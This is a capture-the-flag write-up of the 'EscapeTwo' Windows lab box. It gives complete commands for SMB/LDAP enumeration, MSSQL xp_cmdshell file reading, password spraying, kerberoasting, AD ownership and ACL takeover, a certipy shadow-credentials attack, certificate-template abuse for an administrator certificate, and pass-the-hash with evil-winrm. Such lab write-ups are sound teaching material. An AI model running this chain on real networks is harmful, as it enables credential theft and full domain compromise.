@@ -1,0 +1,206 @@
+Description:
+EscapeTwo is a windows box that focuses on LDAP, SMB, and Active Directory
+Vulnerabilities. While this box is labeled as easy it requires an extensive knowledge of
+both enumeration tools and exploiting tools.
+Difficulty: Easy
+Operating System: Windows Server 2000
+Default Creds: rose / KxEPkKe6R8su
+Skills Required:
+  Basic SMB Enumeration
+  Intermediate understanding of LDAP
+  Intermediate understanding of Active Directory
+  Basic ExpressSQL knowledge
+
+
+Tools Used:
+  nmap
+  netexec
+  impacket
+  bloodhound
+  bloodyAD
+  smbclient
+  evil-winrm
+  certipy
+Enumeration
+
+Port Scanning - Nmap
+
+
+
+
+nmap -A -T5 -oN nmap.txt 10.10.x.x --min-rate 2000 -Pn
+This Nmap scan reveals quiet a bit of active services on this windows machine. It seems
+this machine was setup to simulate an active directory domain controller, a certificate
+authority, an SQL server, and smb server. There is quite a lot to unpack here so the first
+bit of enumeration I did was with the ldap users and smb shares.
+LDAP / SMB Enumeration - NetExec
+
+
+
+
+netexec ldap 10.10.x.x -u rose - KxEPkKe6R8su --users
+To enumerate the active directory users I first used netexec with the box provided
+credentials using the --users flag. This enumeration shows potential user accounts to
+access along with confirming the sql_svc user and ca_svc users for the SQL server and
+Certificate Authority respectively.
+
+
+
+
+smbclient -L //10.10.x.x/ -U rose
+Moving onto enumerating the SMB shares using smbclient we are able to see a
+Accounting Department disk with read access.
+
+
+
+
+smbclient "/10.10.x.x/Accounting Department" -U rose
+Looking into it further we can see the share contains an accounting and accounts
+spreadsheet that we can analyze further.
+It seems the files are corrupted however we can still extract the internal xml files that
+make up the spreadsheet to find a plethora of credentials we can mess around with
+and attempt to authenticate with. The most interesting of which is the sa@sequel.htb
+user which is the mysql server.
+mssqlclient.py 'sa:[password]'@10.10.x.x
+Using impacket's mssqlclient we can login to the database and do some further
+enumeration for credentials or obtain the user flag.
+
+
+
+
+EXEC xp_cmdshell 'type \SQL2019\ExpressAdv_ENU\sql-Configuration.INI';
+With a little help from ChatGPT, as an admin user on the Microsoft SQL server we can
+run code execution via the xp_cmdshell which allows us to find any files on the system
+we should not be able to access.
+After a bit of digging there was no user flag, however there was a configuration file that
+contained the old sql_svc password which we can use in our password spray attack
+later.
+
+
+Foothold
+
+User Enumeration
+Next we can create a users.txt and a pass.txt with our collection of creds to run a
+password spray for the right credentials.
+
+
+
+
+nxc smb 10.10.x.x -u users.txt -p pass.txt
+While the correct way to check for users with windows remote management
+permissions would be to spray the winrm protocol; I found spraying the smb protocol,
+then the winrm, with the valid creds, yielded faster results.
+evil-winrm -i 10.10.x.x -u ryan -p [password]
+Once we have found our Pwned creds for winrm, we can launch evil-winrm to gain
+shell to the system as the user ryan. This is where we can find our user flag!
+
+
+Privilege Escalation
+So what next? Since this is a easy box we probably just kerberoast the administrator
+creds right? Well ..
+
+
+
+
+GetUserSPNs.py sequel.htb/ryan:[password] -dc-ip 10.10.x.x -request
+After kerberoasting using our higher privileged account, we notice that we can only
+access the kerberos tickets of sql_svc and ca_svc. This tells us we are going to have to
+go through the certificate authority to gain access to the administrator account.
+Active Directory Enumeration - bloodhound
+
+
+
+
+bloodhound-python -u ryan -p [password] -dc dc01.sequel.htb -d sequel.htb
+-c all -ns 10.10.x.x
+Using ryan's creds we can run a bloodhound scan on the active directory to visualize
+what permissions we do have.
+In this case ryan@sequel.htb only has one outbound object control. This control is the
+WriteOwner on the certificate authority account. This allows is to gain full-control over
+the ca_svc, dump their password hash, and deploy a malicious certificate template that
+we can then use to dump the administrator password hash.
+
+
+AD CS Exploitation - certipy / impacket / bloodyAD
+
+
+Step 1: Take control of the Certificate Authority
+This process will be alot like setting user permissions in windows except all via the
+command line, while the commands are syntax heavy the steps are straight forward.
+
+
+
+
+$ bloodyAD -u ryan -p [password] -d sequel.htb --host dc01.sequel.htb set
+owner ca_svc ryan
+firstly we will set the owner of the ca_svc account to ryan.
+
+
+
+
+dacledit.py -action write -rights FullControl -principal ryan -target
+ca_svc sequel.htb/ryan:[password]
+Next up we use impacket to edit the access control list to allow ryan full control over the
+ca_svc user.
+certipy-ad shadow auto -u ryan@sequel.htb -p [password] -account ca_svc
+Now that we have FullControl over the ca_svc lets now run a certificate shadow attack
+to dump the NT password hash.
+A shadow attack, in a simplified sense, is an attack that makes a link from your account
+to the target user and acts like the user. This is called shadowing the user, which we
+then use to ask the CA for a certificate of the shadowed user. With this certificate certipy
+then dumps the NT hash for the user for us.
+
+
+Step 2: Find and Exploit a vulnerable certificate template
+
+
+
+
+certipy-ad find -u ryan@sequel.htb -p [password]
+To find a vulnerable template we can generate bloodhound data for all the certificate
+templates and inspect them via bloodhound.
+in my case, to save time, I found the most obvious template name to attack.
+DunderMifflinAuthentication is more than likely the template we are supposed to use in
+this attack.
+
+
+
+
+KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template
+DunderMifflinAuthentication -dc-ip 10.10.x.x - target dc01.sequel.htb
+Using the kerberos ticket certipy grabbed for us during the shadow attack, we can
+create a certificate with the vulnerable template. We can then later use it to authenticate
+the administrator account against the cert and dump the NT hash of the admin user.
+Step 3: Dump The Administrator password hash
+
+
+
+
+certipy -ad req -u ca_svc -hashes :[ca_svc NT hash] -ca sequel-DC01-CA -
+template DunderMifflinAuthentication -target DC01.sequel.htb -dc-ip
+10.10.x.x -dns 10.10.x.x -ns 10.10.x.x -upn administrator@sequel.htb
+He we use this vulnerable template to request a cert of the administrator as the
+certificate authority. This effectively gives us a valid certificate to login as the admin
+user.
+
+
+
+
+certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb
+Lastly we will use this certificate to authenticate as the administrator to dump the NT
+hash of the user.
+This output shows two hashes the outdated LM hash and the NT hash separated by a
+colon. Its important to note that the LM hash is a placeholder as this hash is disabled on
+almost all windows systems. We are only interested in the NT hash.
+
+
+
+
+evil-winrm -i 10.10.x.x -u administrator -H [NT Hash]
+Using the NT hash can "Pass-the-Hash" to the Evil-WinRM to skip trying to crack the
+password and gain shell. After this we can simply type the root flag.
+References
+Certificate templates | The Hacker Recipes
+05 ‐ Usage · ly4k/Certipy Wiki
+AD CS Exploitation
+
